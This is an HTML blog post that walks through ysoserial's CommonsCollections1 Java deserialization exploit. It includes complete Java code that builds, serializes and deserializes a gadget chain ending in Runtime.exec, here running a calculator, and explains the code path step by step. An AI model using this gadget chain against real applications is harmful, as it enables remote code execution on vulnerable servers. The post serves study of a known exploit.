<?xml version="1.0" encoding="utf-8"?>
<!DOCTYPE html PUBLIC "-//W3C//DTD XHTML 1.0 Strict//EN"
"http://www.w3.org/TR/xhtml1/DTD/xhtml1-strict.dtd">
<html xmlns="http://www.w3.org/1999/xhtml" lang="en" xml:lang="en">
<head>
<title>Understanding ysoserial's CommonsCollections1 exploit</title>
<!-- 2018-01-25 목 13:00 -->
<meta  http-equiv="Content-Type" content="text/html;charset=utf-8" />
<meta  name="generator" content="Org-mode" />
<style type="text/css">
 <!--/*--><![CDATA[/*><!--*/
  .title  { text-align: center; }
  .todo   { font-family: monospace; color: red; }
  .done   { color: green; }
  .tag    { background-color: #eee; font-family: monospace;
            padding: 2px; font-size: 80%; font-weight: normal; }
  .timestamp { color: #bebebe; }
  .timestamp-kwd { color: #5f9ea0; }
  .right  { margin-left: auto; margin-right: 0px;  text-align: right; }
  .left   { margin-left: 0px;  margin-right: auto; text-align: left; }
  .center { margin-left: auto; margin-right: auto; text-align: center; }
  .underline { text-decoration: underline; }
  #postamble p, #preamble p { font-size: 90%; margin: .2em; }
  p.verse { margin-left: 3%; }
  pre {
    border: 1px solid #ccc;
    box-shadow: 3px 3px 3px #eee;
    padding: 8pt;
    font-family: monospace;
    overflow: auto;
    margin: 1.2em;
  }
  pre.src {
    position: relative;
    overflow: visible;
    padding-top: 1.2em;
  }
  pre.src:before {
    display: none;
    position: absolute;
    background-color: white;
    top: -10px;
    right: 10px;
    padding: 3px;
    border: 1px solid black;
  }
  pre.src:hover:before { display: inline;}
  pre.src-sh:before    { content: 'sh'; }
  pre.src-bash:before  { content: 'sh'; }
  pre.src-emacs-lisp:before { content: 'Emacs Lisp'; }
  pre.src-R:before     { content: 'R'; }
  pre.src-perl:before  { content: 'Perl'; }
  pre.src-java:before  { content: 'Java'; }
  pre.src-sql:before   { content: 'SQL'; }

  table { border-collapse:collapse; }
  caption.t-above { caption-side: top; }
  caption.t-bottom { caption-side: bottom; }
  td, th { vertical-align:top;  }
  th.right  { text-align: center;  }
  th.left   { text-align: center;   }
  th.center { text-align: center; }
  td.right  { text-align: right;  }
  td.left   { text-align: left;   }
  td.center { text-align: center; }
  dt { font-weight: bold; }
  .footpara:nth-child(2) { display: inline; }
  .footpara { display: block; }
  .footdef  { margin-bottom: 1em; }
  .figure { padding: 1em; }
  .figure p { text-align: center; }
  .inlinetask {
    padding: 10px;
    border: 2px solid gray;
    margin: 10px;
    background: #ffffcc;
  }
  #org-div-home-and-up
   { text-align: right; font-size: 70%; white-space: nowrap; }
  textarea { overflow-x: auto; }
  .linenr { font-size: smaller }
  .code-highlighted { background-color: #ffff00; }
  .org-info-js_info-navigation { border-style: none; }
  #org-info-js_console-label
    { font-size: 10px; font-weight: bold; white-space: nowrap; }
  .org-info-js_search-highlight
    { background-color: #ffff00; color: #000000; font-weight: bold; }
  /*]]>*/-->
</style>
<script type="text/javascript">
/*
@licstart  The following is the entire license notice for the
JavaScript code in this tag.

Copyright (C) 2012-2013 Free Software Foundation, Inc.

The JavaScript code in this tag is free software: you can
redistribute it and/or modify it under the terms of the GNU
General Public License (GNU GPL) as published by the Free Software
Foundation, either version 3 of the License, or (at your option)
any later version.  The code is distributed WITHOUT ANY WARRANTY;
without even the implied warranty of MERCHANTABILITY or FITNESS
FOR A PARTICULAR PURPOSE.  See the GNU GPL for more details.

As additional permission under GNU GPL version 3 section 7, you
may distribute non-source (e.g., minimized or compacted) forms of
that code without the copy of the GNU GPL normally required by
section 4, provided you include this license notice and a URL
through which recipients can access the Corresponding Source.


@licend  The above is the entire license notice
for the JavaScript code in this tag.
*/
<!--/*--><![CDATA[/*><!--*/
 function CodeHighlightOn(elem, id)
 {
   var target = document.getElementById(id);
   if(null != target) {
     elem.cacheClassElem = elem.className;
     elem.cacheClassTarget = target.className;
     target.className = "code-highlighted";
     elem.className   = "code-highlighted";
   }
 }
 function CodeHighlightOff(elem, id)
 {
   var target = document.getElementById(id);
   if(elem.cacheClassElem)
     elem.className = elem.cacheClassElem;
   if(elem.cacheClassTarget)
     target.className = elem.cacheClassTarget;
 }
/*]]>*///-->
</script>
</head>
<body>
<div id="content">
<h1 class="title">Understanding ysoserial's CommonsCollections1 exploit</h1>
<div id="table-of-contents">
<h2>Table of Contents</h2>
<div id="text-table-of-contents">
<ul>
<li><a href="#sec-1">1. An Overview</a></li>
<li><a href="#sec-2">2. Pre-requisities</a></li>
<li><a href="#sec-3">3. Payload Only Execution</a></li>
<li><a href="#sec-4">4. Putting it all together</a></li>
<li><a href="#sec-5">5. Ref</a></li>
</ul>
</div>
</div>
<p>
Last year(2015), ysoserial was released by frohoff and gebl. It is a fantastic piece of work. The tool provides options to generate several different types of serialized objects, which when deserialized, can result in arbitrary code execution if the right classes are present in the classpath. In this post, I will discuss the <code>CommonsCollections1</code> exploit, and its working, available in the ysoserial toolkit. 
</p>

<p>
<b>All code snippets used in this post are sourced from ysoserial</b>
</p>


<div id="outline-container-sec-1" class="outline-2">
<h2 id="sec-1"><span class="section-number-2">1</span> An Overview</h2>
<div class="outline-text-2" id="text-1">
<p>
The CommonsCollections1 exploit builds a custom AnnotationInvocationHandler object that contains an InvokerTransformer (Apache Commons Collections class)payload, and outputs the serializaed object. When the serialized object is deserialized, the code path from AnnotationInvocationHandler's readObject leads to InvokerTransformer's payload, causing code execution.
</p>

<p>
The image below shows the custom AnnotationInvocationHandler object used for RCE.
</p>

<p>
When the serialized object is deserialized, the code path from AnnotationInvocationHandler's readObject leads to Invoker Transformer's payload, causing code execution.
</p>

<p>
The image below shows the custom AnnotationInvocationHandler object used for RCE.
</p>

<div class="figure">
<p><img src="./img/Serialized_Object_Structure.png" alt="Serialized_Object_Structure.png" />
</p>
<p><span class="figure-number">Figure 1:</span> The serialized AnnotationInvocationHandler</p>
</div>

<p>
What makes the exploit effective is that it only relies on the classes present in Java and Apache Commons Collections. The CommonsCollections1 leverages following classes from JDK and Commons Collections. 
</p>

<p>
<b>From JDK</b>
</p>
<p class="verse">
1. AnnotationInvocationHandler<br  />
2. Proxy<br  />
3. Map<br  />
4. Override<br  />
5. InvocationHandler<br  />
6. Runtime<br  />
</p>

<p>
<b>From Commons Collections</b>
</p>
<p class="verse">
1. LazyMap<br  />
2. Transformer<br  />
3. ChainedTransformer<br  />
4. InvokerTransformer<br  />
</p>

<p>
So, as long a Java software stack contains Apache commons Collections library(&lt;= 3.2.1), it will be vulnerable to remote execution attacks while deserializing untrusted objects. 
</p>
</div>
</div>

<div id="outline-container-sec-2" class="outline-2">
<h2 id="sec-2"><span class="section-number-2">2</span> Pre-requisities</h2>
<div class="outline-text-2" id="text-2">
<p>
It will be helpful to refer to the following Classes and concepts as we work our way to understaing the exploit. 
</p>

<p class="verse">
1. Java Serialization and Deserialization mechanisms<br  />
2. <font color="red">ObjectInputStream</font> - including readObject()<br  />
3. <font color="red">Proxy</font><br  />
4. <font color="red">InvocationHandler</font><br  />
5. <font color="red">Transformer</font><br  />
6. <font color="red">LazyMap</font><br  />
7. <font color="red">ChainedTransformer</font><br  />
8. <font color="red">InvokerTransformer</font> - Instances of this class were used to perform code execution and we will discuss this in more details below.<br  />
</p>

<p>
Since InvokerTransformer class is the eventual sink that performs code execution, lets us take a closer look at it. An InvokerTransformer constructor takes three parameters:
</p>
<p class="verse">
1. Name of the method<br  />
2. Parameter types the method accepts<br  />
3. Parameters values<br  />
</p>


<div class="figure">
<p><img src="./img/InvokerTransformer-constructor.png" alt="InvokerTransformer-constructor.png" />
</p>
<p><span class="figure-number">Figure 2:</span> The constructor of InvokerTransformer</p>
</div>

<p>
An InvokerTransformer instance accepts an object as input and outputs the transformed object. The tranformation is determined by the instatiation parameters. The InvokerTransformer first finds a method with the method name (specified as first parameter) that accepts the given parameters types (specified as second paramter) on the incoming object. Upon finding a matching method, the method on the incoming object and the parameter values from (3) as passed arguments into the method. The returned value is the value of the method execution. 
</p>


<div class="figure">
<p><img src="./img/InvokerTransformer.png" alt="InvokerTransformer.png" />
</p>
<p><span class="figure-number">Figure 3:</span> Shows InvokerTransformer</p>
</div>
</div>
</div>


<div id="outline-container-sec-3" class="outline-2">
<h2 id="sec-3"><span class="section-number-2">3</span> Payload Only Execution</h2>
<div class="outline-text-2" id="text-3">
<p>
Assuming you understand how Transformers, ChainedTransformers and LazyMaps work, we will look at CommonsCollections1's payload only execution using a ChainedTransformer. When you run the class below, it will open a calculator on a Mac.
</p>

<div class="org-src-container">

<pre class="src src-java">public class CommonsCollections1PayloadOnly {
	public static void main(String... args) {
		String[] command = {"open -a calculator"};
		final Transformer[] transformers = new Transformer[]{
				new ConstantTransformer(Runtime.class), //(1)
				new InvokerTransformer("getMethod",
						new Class[]{ String.class, Class[].class},
						new Object[]{"getRuntime", new Class[0]}
				), //(2)
				new InvokerTransformer("invoke",
						new Class[]{Object.class, Object[].class},
						new Object[]{null, new Object[0]}
				), //(3)
				new InvokerTransformer("exec",
						new Class[]{String.class},
						command
				) //(4)
		};
		ChainedTransformer chainedTransformer = new ChainedTransformer(transformers);
		Map map = new HashMap&lt;&gt;();
		Map lazyMap = LazyMap.decorate(map, chainedTransformer);
		lazyMap.get("gursev");
	}
}
</pre>
</div>

<p>
The image below the execution flow when the chainedTransformer in the code snippet above is executed while setting a value on the lazyMap. The number in braces correspond to the individual Transformer execution in the code snippet above. 
</p>


<div class="figure">
<p><img src="./img/InvokerTransformer-3.png" alt="InvokerTransformer-3.png" />
</p>
<p><span class="figure-number">Figure 4:</span> Show chainedTransformer invocation when a value is set on the LazyMap</p>
</div>
</div>
</div>

<div id="outline-container-sec-4" class="outline-2">
<h2 id="sec-4"><span class="section-number-2">4</span> Putting it all together</h2>
<div class="outline-text-2" id="text-4">
<p>
The code below performs both serialization and deserialization. It also executes the command to open a calculator during the deserialization process. 
</p>

<p class="verse">
1. The getEvilObject creates a Java Object that can arbitary code when deserialized. The object structure is provided in Figure 1.<br  />
2. The serializeToByteArray method serializes the evilObject to a byte array.<br  />
3. The deserializeFromByteArray deserializes the object from the binary array. If Apache CommonCollections library(&lt;=3.2.1) is present in the classpath, the command also gets executed.<br  />
</p>

<div class="org-src-container">

<pre class="src src-java">import java.io.ByteArrayInputStream;
import java.io.ByteArrayOutputStream;
import java.io.IOException;
import java.io.ObjectInputStream;
import java.io.ObjectOutputStream;
import java.lang.reflect.Constructor;
import java.lang.reflect.InvocationHandler;
import java.lang.reflect.InvocationTargetException;
import java.lang.reflect.Proxy;
import java.util.HashMap;
import java.util.Map;

import org.apache.commons.collections.Transformer;
import org.apache.commons.collections.functors.ChainedTransformer;
import org.apache.commons.collections.functors.ConstantTransformer;
import org.apache.commons.collections.functors.InvokerTransformer;
import org.apache.commons.collections.map.LazyMap;

public class CommonsCollections1All {

	public static void main(String... args) throws ClassNotFoundException, IllegalAccessException, InvocationTargetException, InstantiationException, IOException {
		Object evilObject = getEvilObject();
		byte[] serializedObject = serializeToByteArray(evilObject);
		deserializeFromByteArray(serializedObject);
	}

	public static Object getEvilObject() throws ClassNotFoundException, IllegalAccessException, InvocationTargetException, InstantiationException {

		String[] command = {"open -a calculator"};

		final Transformer[] transformers = new Transformer[]{

				new ConstantTransformer(Runtime.class),

				new InvokerTransformer("getMethod",
						new Class[]{ String.class, Class[].class},
						new Object[]{"getRuntime", new Class[0]}
				),

				new InvokerTransformer("invoke",
						new Class[]{Object.class, Object[].class},
						new Object[]{null, new Object[0]}
				),

				new InvokerTransformer("exec",
						new Class[]{String.class},
						command
				)
		};

		ChainedTransformer chainedTransformer = new ChainedTransformer(transformers);

		Map map = new HashMap&lt;&gt;();
		Map lazyMap = LazyMap.decorate(map, chainedTransformer);

		String classToSerialize = "sun.reflect.annotation.AnnotationInvocationHandler";
		final Constructor&lt;?&gt; constructor = Class.forName(classToSerialize).getDeclaredConstructors()[0];
		constructor.setAccessible(true);
		InvocationHandler secondInvocationHandler = (InvocationHandler) constructor.newInstance(Override.class, lazyMap);
		Proxy evilProxy = (Proxy) Proxy.newProxyInstance(CommonsCollections1All.class.getClassLoader(), new Class[] {Map.class}, secondInvocationHandler );

		InvocationHandler invocationHandlerToSerialize = (InvocationHandler) constructor.newInstance(Override.class, evilProxy);
		return invocationHandlerToSerialize;

	}

	public static void deserializeAndDoNothing(byte[] byteArray) throws IOException, ClassNotFoundException {
		ObjectInputStream ois = new ObjectInputStream(new ByteArrayInputStream(byteArray));
		ois.readObject();
	}

	public static byte[] serializeToByteArray(Object object) throws IOException {
		ByteArrayOutputStream serializedObjectOutputContainer = new ByteArrayOutputStream();
		ObjectOutputStream objectOutputStream = new ObjectOutputStream(serializedObjectOutputContainer);
		objectOutputStream.writeObject(object);
		return serializedObjectOutputContainer.toByteArray();
	}

	public static Object deserializeFromByteArray(byte[] serializedObject) throws IOException, ClassNotFoundException {
		ByteArrayInputStream serializedObjectInputContainer = new ByteArrayInputStream(serializedObject);
		ObjectInputStream objectInputStream = new ObjectInputStream(serializedObjectInputContainer);
		InvocationHandler evilInvocationHandler = (InvocationHandler) objectInputStream.readObject();
		return evilInvocationHandler;
	}
}
</pre>
</div>

<p>
The code path flow leading to code execution is discuessed below and is also summarized in figure 5. 
</p>

<p class="verse">
1. The ObjectInputStream calls the readObject() method.<br  />
2. On method invocation, the JVM looks for the serialized Object's class in the classpath. If the class is not found, ClassNotFoundException is thrown. If the class is found, readObject() method of the identified class (AnnotationInvocationHandler) is invoked. This process is followed for all types of objects that get serialized with the CommonsCollections1 payload.<br  />
3. The readObject method inside the AnnotationInvocationHandler invokes entrySet method on the MapProxy.<br  />
4. The method invocation on the Proxy is transferred to AnnotationInvocationHandler coressponding to the MapProxy instance along with the method and a blank array.<br  />
5. The lazyMap attempts to retrieve a value with key equal to the method name "entrySet".<br  />
6. Since that key does not exist, the lazyMap instance goes ahead and tries to create a new key with the name "entrySet".<br  />
7. Since a chainedTransformer is set to execute during the key creation process, the chained transformer with the malicious payload is invoked, leading to remote code execution.<br  />
</p>


<div class="figure">
<p><img src="./img/Exploit Flow.png" alt="Exploit Flow.png" />
</p>
<p><span class="figure-number">Figure 5:</span> Show the code path to RCE</p>
</div>

<p>
The following three images show the actual code path traversed from AnnotationInvocationHandler class leading up to LazyMap's ChainedTransformer invocation, resulting in RCE.
</p>


<div class="figure">
<p><img src="./img/readObject.png" alt="readObject.png" />
</p>
<p><span class="figure-number">Figure 6:</span> Shows AnnotationInvocationHandler's readObject() method that calls entrySet() on mapProxy</p>
</div>


<div class="figure">
<p><img src="./img/invoke-method.png" alt="invoke-method.png" />
</p>
<p><span class="figure-number">Figure 7:</span> Shows AnnotationInvocationHandler's invoke method that was attached to the mapProxy</p>
</div>


<div class="figure">
<p><img src="./img/getmethod-in-lazymap.png" alt="getmethod-in-lazymap.png" />
</p>
<p><span class="figure-number">Figure 8:</span> Shows transformer invocation when a key is not present</p>
</div>
</div>
</div>





<div id="outline-container-sec-5" class="outline-2">
<h2 id="sec-5"><span class="section-number-2">5</span> Ref</h2>
<div class="outline-text-2" id="text-5">
</div>
</div>
</div>
<div id="postamble" class="status">
<p class="date">Created: 2018-01-25 목 13:00</p>
<p class="creator"><a href="http://www.gnu.org/software/emacs/">Emacs</a> 24.5.1 (<a href="http://orgmode.org">Org</a> mode 8.2.10)</p>
<p class="validation"><a href="http://validator.w3.org/check?uri=referer">Validate</a></p>
</div>
</body>
</html>
